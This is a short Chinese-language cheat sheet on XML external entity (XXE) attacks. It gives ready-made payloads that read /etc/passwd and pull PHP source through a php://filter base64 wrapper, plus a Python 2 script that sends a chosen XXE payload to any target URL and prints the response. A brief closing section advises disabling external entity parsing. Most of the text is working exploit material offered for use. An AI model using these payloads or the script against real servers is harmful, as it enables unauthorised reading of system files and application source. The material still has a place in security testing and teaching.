---
title: xxe payload
tags: xxe,payload,001
grammar_cjkRuby: true
---

XML在调用外部实体整体的写法如下：

``` xml
 <?xml version="1.0" encoding="utf-8"?>

  <!DOCTYPE xdsec [

  <!ELEMENT methodname ANY >

  <!ENTITY xxe(实体引用名) SYSTEM "file:///etc/passwd"(实体内容) >]>

  <methodcall>

  <methodname>&xxe;</methodname>

  </methodcall>
```

查看passwd文件POC：

``` xml
<?xml version="1.0" encoding="utf-8"?> 

<!DOCTYPE xxe [

<!ELEMENT name ANY >

<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>

<root>

<name>&xxe;</name>

</root>
```

调用php命令poc：

``` xml
<?xml version="1.0" encoding="utf-8"?> 

<!DOCTYPE xxe [

<!ELEMENT name ANY >

<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >]>

<root>

<name>&xxe;</name>

</root>
```

一个xxe的Python脚本：

``` python

import urllib2

if __name__ == '__main__':

    print u'输入要读取的文件，如file:///etc/passwd'

    payload = raw_input()

    print u'输入要访问的地址，如http://172.16.12.2/simplexml_load_string.php'

    url = raw_input()

    #url = 'http://192.168.70.235/simplexml_load_string.php'

    headers = {'Content-type': 'text/xml'}

    xml = '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE xxe [<!ELEMENT name ANY ><!ENTITY xxe SYSTEM "' + payload + '" >]><root><name>&xxe;</name></root>'

    req = urllib2.Request(url = url,headers = headers, data = xml)

    res_data = urllib2.urlopen(req)

    res = res_data.read()

    print res
```

修复方案：

> 修复方案

    使用libxml2.8.0以上版本xml解析库，默认禁止外部实体的解析

    对于PHP,由于simplexml_load_string函数的XML解析问题出在libxml库上,所以加载实体前可以调用函数进行过滤

    可将外部实体、参数实体和内联DTD都被设置为false，从而避免基于XXE漏洞的攻击。



